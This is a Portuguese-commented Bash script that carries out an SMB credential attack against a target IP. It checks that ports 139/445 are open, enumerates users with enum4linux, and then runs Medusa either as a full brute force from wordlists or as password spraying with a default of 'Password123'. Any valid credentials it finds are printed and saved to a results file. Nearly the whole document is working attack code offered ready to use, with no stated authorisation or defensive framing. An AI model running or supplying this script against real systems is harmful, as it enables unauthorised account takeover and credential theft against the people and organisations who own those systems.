#!/bin/bash

#########################################
# Script de Ataque SMB com Medusa
# Uso: ./ataque_smb.sh <IP_ALVO>
# Autor: Lucas
# Data: 2025-11-13
#########################################

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Verificar se foi passado um IP
if [ -z "$1" ]; then
    echo -e "${RED}[ERRO]${NC} Por favor, forneça o IP do alvo"
    echo "Uso: $0 <IP_ALVO>"
    exit 1
fi

TARGET=$1
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORDLIST_DIR="$SCRIPT_DIR/../wordlists"
USERS_FILE="$WORDLIST_DIR/usuarios.txt"
PASSWORDS_FILE="$WORDLIST_DIR/senhas_comuns.txt"
RESULTS_FILE="$SCRIPT_DIR/../resultados_smb_$(date +%Y%m%d_%H%M%S).txt"

echo -e "${YELLOW}[*]${NC} =========================================="
echo -e "${YELLOW}[*]${NC} Ataque de Força Bruta em SMB/CIFS"
echo -e "${YELLOW}[*]${NC} =========================================="
echo -e "${YELLOW}[*]${NC} Alvo: $TARGET"
echo -e "${YELLOW}[*]${NC} Data: $(date)"
echo ""

# Verificar se o Medusa está instalado
if ! command -v medusa &> /dev/null; then
    echo -e "${RED}[ERRO]${NC} Medusa não está instalado!"
    echo "Execute: sudo apt install medusa -y"
    exit 1
fi

# Verificar conectividade
echo -e "${YELLOW}[*]${NC} Verificando conectividade..."
if ping -c 1 -W 2 "$TARGET" &> /dev/null; then
    echo -e "${GREEN}[+]${NC} Alvo está acessível"
else
    echo -e "${RED}[ERRO]${NC} Alvo não está acessível"
    exit 1
fi

# Verificar porta SMB
echo -e "${YELLOW}[*]${NC} Verificando portas SMB (139/445)..."
SMB_OPEN=false

if timeout 5 bash -c "echo > /dev/tcp/$TARGET/445" 2>/dev/null; then
    echo -e "${GREEN}[+]${NC} Porta 445 (SMB) está aberta"
    SMB_OPEN=true
fi

if timeout 5 bash -c "echo > /dev/tcp/$TARGET/139" 2>/dev/null; then
    echo -e "${GREEN}[+]${NC} Porta 139 (NetBIOS) está aberta"
    SMB_OPEN=true
fi

if [ "$SMB_OPEN" = false ]; then
    echo -e "${RED}[ERRO]${NC} Nenhuma porta SMB está aberta"
    exit 1
fi

# Enumerar usuários se enum4linux estiver disponível
if command -v enum4linux &> /dev/null; then
    echo ""
    echo -e "${BLUE}[*]${NC} Tentando enumerar usuários com enum4linux..."
    ENUM_USERS=$(mktemp)
    timeout 30 enum4linux -U "$TARGET" 2>/dev/null | grep "user:" | cut -d '[' -f2 | cut -d ']' -f1 > "$ENUM_USERS"
    
    if [ -s "$ENUM_USERS" ]; then
        echo -e "${GREEN}[+]${NC} Usuários encontrados:"
        cat "$ENUM_USERS" | head -n 10
        
        read -p "Deseja usar esses usuários para o ataque? (s/N): " use_enum
        if [[ $use_enum =~ ^[Ss]$ ]]; then
            USERS_FILE="$ENUM_USERS"
        fi
    else
        echo -e "${YELLOW}[-]${NC} Não foi possível enumerar usuários"
        rm -f "$ENUM_USERS"
    fi
fi

echo ""
echo -e "${YELLOW}[*]${NC} Configurações do Ataque:"
echo -e "${YELLOW}[*]${NC} - Wordlist de usuários: $USERS_FILE ($(wc -l < "$USERS_FILE") usuários)"
echo -e "${YELLOW}[*]${NC} - Wordlist de senhas: $PASSWORDS_FILE ($(wc -l < "$PASSWORDS_FILE") senhas)"
echo -e "${YELLOW}[*]${NC} - Threads: 1 (recomendado para SMB)"
echo -e "${YELLOW}[*]${NC} - Arquivo de resultados: $RESULTS_FILE"
echo ""

# Escolher tipo de ataque
echo -e "${BLUE}[?]${NC} Selecione o tipo de ataque:"
echo "1) Força bruta completa (usuários + senhas)"
echo "2) Password spraying (uma senha comum, múltiplos usuários)"
read -p "Opção [1-2]: " attack_type

case $attack_type in
    1)
        echo ""
        echo -e "${GREEN}[+]${NC} Iniciando ataque de força bruta completo..."
        echo ""
        
        medusa -h "$TARGET" \
               -U "$USERS_FILE" \
               -P "$PASSWORDS_FILE" \
               -M smbnt \
               -t 1 \
               -v 4 \
               -O "$RESULTS_FILE"
        ;;
    2)
        read -p "Digite a senha para password spraying [Password123]: " spray_pass
        spray_pass=${spray_pass:-Password123}
        
        echo ""
        echo -e "${GREEN}[+]${NC} Iniciando password spraying com senha: $spray_pass"
        echo ""
        
        medusa -h "$TARGET" \
               -U "$USERS_FILE" \
               -p "$spray_pass" \
               -M smbnt \
               -t 1 \
               -v 4 \
               -O "$RESULTS_FILE"
        ;;
    *)
        echo -e "${RED}[ERRO]${NC} Opção inválida"
        exit 1
        ;;
esac

# Verificar resultado
if [ $? -eq 0 ]; then
    echo ""
    echo -e "${GREEN}[+]${NC} Ataque concluído!"
    echo -e "${YELLOW}[*]${NC} Resultados salvos em: $RESULTS_FILE"
    
    if grep -q "SUCCESS" "$RESULTS_FILE"; then
        echo ""
        echo -e "${GREEN}[+]${NC} =========================================="
        echo -e "${GREEN}[+]${NC} CREDENCIAIS ENCONTRADAS:"
        echo -e "${GREEN}[+]${NC} =========================================="
        grep "SUCCESS" "$RESULTS_FILE"
        echo -e "${GREEN}[+]${NC} =========================================="
    else
        echo ""
        echo -e "${RED}[-]${NC} Nenhuma credencial válida encontrada"
    fi
else
    echo ""
    echo -e "${RED}[ERRO]${NC} Ocorreu um erro durante o ataque"
fi

# Limpar arquivo temporário se existir
[ -f "$ENUM_USERS" ] && rm -f "$ENUM_USERS"

echo ""
echo -e "${YELLOW}[*]${NC} Finalizado em: $(date)"
